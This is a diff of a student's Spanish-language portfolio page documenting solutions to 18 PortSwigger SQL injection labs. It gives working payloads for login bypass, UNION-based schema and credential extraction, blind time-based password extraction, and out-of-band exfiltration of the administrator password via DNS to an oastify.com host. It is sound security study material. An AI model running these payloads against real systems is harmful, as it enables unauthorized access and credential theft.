@@ -16,14 +16,53 @@
     <link href="css/styles.css" rel="stylesheet" />
 </head>
 
+<style>
+    .container{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(400px,1fr));
+    gap:25px;
+}
+
+.card{
+    background:#1e293b;
+    padding:25px;
+    border-radius:10px;
+    box-shadow:0px 0px 10px rgba(0,0,0,0.5);
+}
+
+.card h2{
+    color:#38bdf8;
+}
+
+.tipo{
+    color:#facc15;
+    font-weight:bold;
+}
+
+.payload{
+    background:#020617;
+    padding:15px;
+    border-radius:6px;
+    margin-top:10px;
+    font-family:monospace;
+    color:#4ade80;
+    overflow-x:auto;
+}
+
+.descripcion{
+    margin-top:10px;
+    line-height:1.5;
+}
+
+</style>
 
 <body id="page-top">
 
 <div class="container-fluid p-0">
             <!-- About-->
-            <section class="resume-section" id="inicio">
-                <div class="resume-section-content">
-                    <h1 class="mb-0">
+    <section class="resume-section" id="inicio">
+        <div class="resume-section-content">
+            <h1 class="mb-0">
                         ROAD TO HALL OF FAME:  
                         <span class="text-primary">SQL INJECTION</span>
                     </h1>
@@ -31,24 +70,382 @@
                         Luis Eduardo Aznar Cuevas "Wraith" · CNO V Seguridad Informatica · Universidad Politecnica de SLP · Semestre 8 
                         <a href="mailto:179880@upslp.edu.mx">179880@upslp.edu.mx</a>
                     </div>
-                    <h3>Presentacion</h3>
-                    <p><b>El proposito</b> de este portafolio es de recopilar los trabajos de Seguridad Informatica CNO V, </p>
+                    <h3>Resolviendo Laboratorios de Inyeccion de SQL</h3>
+                    <p><b>Los laboratorios</b> de esta actividad fueron resueltos utilizando BURP SUITE, de PORTSWIGGER, esta herramienta funcionando como un interceptor y agresor para encontrar vulnerabilidades a las paginas de ejemplo, estas paginas siendo vulnerables a inyecciones SQL </p>
                     <p><b>El enfoque</b> es para continuar con el aprendizaje sobre la Seguridad Informatica y convertirse en aprendices sobre la ciberseguridad.</p>
                     <p><b>La importancia</b> de este portafolio es el estudio de los trabajos hechos despues de haber sido realizados en un futuro, mas aparte las lecciones aprendidas por nuestros errores en las actividades para mejorar como estudiantes.</p><br>
-                    <h3>Perfil</h3>
-                    <p>Estudiante de Tecnologias de la Informacion con interes en la ciberseguridad y en el desarrollo web, he trabajado en proyectos relacionados con paginas web y las bases de datos de ellas</p><br>
-                    <h3>Informacion Tecnica</h3>
-                    <ul>
-                        <li>HTML, CSS, JavaScript</li>
-                        <li>PORTAFOLIO PUBLICADO EN GITHUB</li>
-                    </ul>
-                    <div class="social-icons">
-                        <a class="social-icon" href="#!"><i class="fab fa-github"></i></a>
+                    
+
+                    <h1>Resolución de Laboratorios SQL Injection</h1>
+                    
+                    <!-- LAB 01 -->
+                    <div class="card">
+                    <h2>Lab 01</h2>
+                    <p class="tipo">SQL Injection en cláusula WHERE</p>
+
+                    <div class="descripcion">
+                    La aplicación concatena directamente el parámetro <b>category</b> dentro de la consulta SQL.
+                    Esto permite modificar la lógica de la cláusula WHERE para mostrar todos los productos.
+                    </div>
+
+                    <div class="payload">
+                    ' OR 1=1--
+                    </div>
+
+                    <div class="descripcion">
+                    El operador OR convierte la condición en verdadera y el comentario evita que se ejecute el resto de la consulta original.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 02 -->
+                    <div class="card">
+                    <h2>Lab 02</h2>
+                    <p class="tipo">SQL Injection Login Bypass</p>
+
+                    <div class="descripcion">
+                    El formulario de autenticación construye la consulta SQL con los valores ingresados por el usuario.
+                    Un atacante puede cerrar la cadena del nombre de usuario y comentar la validación de contraseña.
+                    </div>
+
+                    <div class="payload">
+                    administrator'--
+                    </div>
+
+                    <div class="descripcion">
+                    El comentario elimina la comprobación del password permitiendo iniciar sesión como administrador.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 03 -->
+                    <div class="card">
+                    <h2>Lab 03</h2>
+                    <p class="tipo">UNION SQL Injection – Oracle</p>
+
+                    <div class="descripcion">
+                    Se utiliza el operador UNION para combinar los resultados de la consulta original con datos del sistema Oracle.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT banner, NULL FROM v$version--
+                    </div>
+
+                    <div class="descripcion">
+                    La tabla del sistema <b>v$version</b> contiene la versión del motor de base de datos Oracle.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 04 -->
+                    <div class="card">
+                    <h2>Lab 04</h2>
+                    <p class="tipo">UNION SQL Injection – MySQL / MSSQL</p>
+
+                    <div class="descripcion">
+                    Primero se identifica el número de columnas y luego se utiliza UNION SELECT para recuperar la versión del servidor.
+                    </div>
+
+                    <div class="payload">
+                    '+UNION+SELECT+@@version,+NULL#
+                    </div>
+
+                    <div class="descripcion">
+                    La variable @@version devuelve la versión del servidor MySQL o SQL Server.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 05 -->
+                    <div class="card">
+                    <h2>Lab 05</h2>
+                    <p class="tipo">UNION SQL Injection – Column Enumeration</p>
+
+                    <div class="descripcion">
+                    Se determina el número de columnas de la consulta original utilizando valores NULL hasta evitar errores.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT NULL,NULL--
+                    </div>
+
+                    <div class="descripcion">
+                    El número de NULL debe coincidir con el número de columnas devueltas por la consulta original.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 06 -->
+                    <div class="card">
+                    <h2>Lab 06</h2>
+                    <p class="tipo">UNION SQL Injection – Text Column Detection</p>
+
+                    <div class="descripcion">
+                    Una vez identificado el número de columnas se prueba cuáles permiten mostrar texto.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT 'test','test'--
+                    </div>
+
+                    <div class="descripcion">
+                    Si el texto aparece en la página significa que esa columna es vulnerable a extracción de datos.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 07 -->
+                    <div class="card">
+                    <h2>Lab 07</h2>
+                    <p class="tipo">UNION SQL Injection – Enumeración de tablas</p>
+
+                    <div class="descripcion">
+                    Se consultan las tablas internas del sistema para descubrir la estructura de la base de datos.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT table_name,NULL FROM information_schema.tables--
+                    </div>
+
+                    <div class="descripcion">
+                    La tabla <b>information_schema.tables</b> contiene los nombres de todas las tablas de la base de datos.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 08 -->
+                    <div class="card">
+                    <h2>Lab 08</h2>
+                    <p class="tipo">UNION SQL Injection – Enumeración de columnas</p>
+
+                    <div class="descripcion">
+                    Una vez identificada la tabla de usuarios se listan las columnas disponibles.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+                    </div>
+
+                    <div class="descripcion">
+                    Permite identificar columnas como <b>username</b> y <b>password</b>.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 09 -->
+                    <div class="card">
+                    <h2>Lab 09</h2>
+                    <p class="tipo">UNION SQL Injection – Extracción de credenciales</p>
+
+                    <div class="descripcion">
+                    Después de enumerar las columnas se recuperan las credenciales almacenadas en la base de datos.
+                    </div>
+
+                    <div class="payload">
+                    ' UNION SELECT username,password FROM users--
+                    </div>
+
+                    <div class="descripcion">
+                    La consulta devuelve directamente los usuarios y contraseñas almacenados en la tabla.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 10 -->
+                    <div class="card">
+                    <h2>Lab 10</h2>
+                    <p class="tipo">Blind SQL Injection (Boolean-based)</p>
+
+                    <div class="descripcion">
+                    La aplicación no muestra errores ni datos directamente, por lo que se utilizan condiciones booleanas.
+                    </div>
+
+                    <div class="payload">
+                    ' AND 1=1--
+                    </div>
+
+                    <div class="descripcion">
+                    Se compara la respuesta cuando la condición es verdadera o falsa para confirmar la vulnerabilidad.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 11 -->
+                    <div class="card">
+                    <h2>Lab 11</h2>
+                    <p class="tipo">Blind SQL Injection – Enumeración de datos</p>
+
+                    <div class="descripcion">
+                    Se utiliza una condición lógica para comprobar carácter por carácter información sensible.
+                    </div>
+
+                    <div class="payload">
+                    ' AND SUBSTRING(username,1,1)='a'--
+                    </div>
+
+                    <div class="descripcion">
+                    Permite descubrir el contenido de una columna mediante inferencia.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 12 -->
+                    <div class="card">
+                    <h2>Lab 12</h2>
+                    <p class="tipo">Blind SQL Injection – Time Based</p>
+
+                    <div class="descripcion">
+                    Se provoca un retraso en la respuesta del servidor cuando una condición es verdadera.
+                    </div>
+
+                    <div class="payload">
+                    ' AND SLEEP(5)--
+                    </div>
+
+                    <div class="descripcion">
+                    Si la página tarda en responder se confirma la ejecución del payload en la base de datos.
+                    </div>
+                    </div>
+
+
+                    <!-- LAB 13 -->
+                    <div class="card">
+                    <h2>Lab 13</h2>
+                    <p class="tipo">Blind SQL Injection – Extracción por tiempo</p>
+
+                    <div class="descripcion">
+                    Se combinan condiciones con funciones de retraso para descubrir información carácter por carácter.
+                    </div>
+
+                    <div class="payload">
+                    ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
+                    </div>
+
+                    <div class="descripcion">
+                    El tiempo de respuesta del servidor indica si la condición es verdadera.
+                    </div>
+                    </div>
+                    <!-- LAB 14 -->
+                    <div class="card">
+
+                        <h2>Lab 14</h2>
+                        <p class="tipo">Blind SQL Injection with Time Delay</p>
+
+                        <div class="descripcion">
+                        Se explota una vulnerabilidad en la cookie <b>TrackingId</b>.  
+                        Se inyecta una consulta que provoca un retraso en la respuesta del servidor usando <b>pg_sleep()</b> para confirmar la ejecución de SQL en PostgreSQL.
+                        </div>
+
+                        <div class="payload">
+                        bhNp4lunWxP91zK6'+||+(SELECT pg_sleep(10))--
+                        </div>
+
+                        <div class="descripcion">
+                        La comilla cierra la consulta original, el operador <b>||</b> concatena la nueva consulta y <b>pg_sleep(10)</b> provoca un retraso de 10 segundos, confirmando la vulnerabilidad.
+                        </div>
+
+                    </div>
+
+
+                    <!-- LAB 15 -->
+                    <div class="card">
+
+                    <h2>Lab 15</h2>
+                    <p class="tipo">Blind SQL Injection with Time Delay & Information Retrieval</p>
+
+                    <div class="descripcion">
+                    Se utiliza una inyección SQL ciega basada en tiempo para obtener la contraseña del usuario administrador carácter por carácter mediante el uso de condiciones.
+                    </div>
+
+                    <div class="payload">
+                    ' || (SELECT CASE 
+                    WHEN (username='administrator' AND substring(password,1,1)='a') 
+                    THEN pg_sleep(2) 
+                    ELSE pg_sleep(-1) 
+                    END FROM users)--
+                    </div>
+
+                    <div class="descripcion">
+                    Si la condición es verdadera, el servidor se retrasa 2 segundos.  
+                    Esto permite identificar cada carácter de la contraseña usando herramientas como <b>Burp Intruder</b>.
+                    </div>
+
+                    </div>
+
+
+                    <!-- LAB 16 -->
+                    <div class="card">
+
+                    <h2>Lab 16</h2>
+                    <p class="tipo">Blind SQL Injection Out-of-Band (OAST)</p>
+
+                    <div class="descripcion">
+                    Se explota la vulnerabilidad para provocar una interacción externa mediante DNS utilizando Burp Collaborator.
+                    </div>
+
+                    <div class="payload">
+                    '+UNION SELECT extractvalue(
+                    xmltype('<?xml version="1.0"?><!DOCTYPE root [
+                    <!ENTITY % remote SYSTEM "http://ID.oastify.com/">
+                    %remote;]>'),'/l') FROM dual--
+                    </div>
+
+                    <div class="descripcion">
+                    Se usa la función <b>extractvalue()</b> de Oracle para forzar una solicitud HTTP externa al dominio del atacante, confirmando la ejecución de la consulta.
+                    </div>
+
+                    </div>
+
+
+                    <!-- LAB 17 -->
+                    <div class="card">
+
+                    <h2>Lab 17</h2>
+                    <p class="tipo">Out-of-Band Data Exfiltration</p>
+
+                    <div class="descripcion">
+                    Similar al laboratorio anterior, pero aquí se exfiltran datos sensibles (contraseña del administrador) a través de consultas DNS.
+                    </div>
+
+                    <div class="payload">
+                    '+UNION SELECT extractvalue(
+                    xmltype('<?xml version="1.0"?><!DOCTYPE root [
+                    <!ENTITY % remote SYSTEM "http://'
+                    ||(SELECT password FROM users WHERE username='administrator')
+                    ||'.ID.oastify.com/">
+                    %remote;]>'),'/l') FROM dual--
+                    </div>
+
+                    <div class="descripcion">
+                    La contraseña se concatena en el subdominio solicitado al servidor del atacante, permitiendo recuperar los datos mediante registros DNS.
+                    </div>
+
+                    </div>
+
+
+                    <!-- LAB 18 -->
+                    <div class="card">
+
+                    <h2>Lab 18</h2>
+                    <p class="tipo">SQL Injection Bypass via XML Encoding</p>
+
+                    <div class="descripcion">
+                    La aplicación filtra palabras clave como SELECT o UNION, pero no detecta entidades XML codificadas.
+                    </div>
+
+                    <div class="payload">
+                    1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username, password FROM users
+                    </div>
+
+                    <div class="descripcion">
+                    Las palabras clave están codificadas en hexadecimal XML, lo que permite evadir el filtro de seguridad mientras la base de datos las interpreta correctamente.
+                    </div>
+
                     </div>
                 </div>
             </section>
             <hr class="m-0" />
-    
+</div>
 </body>
 
 </html>
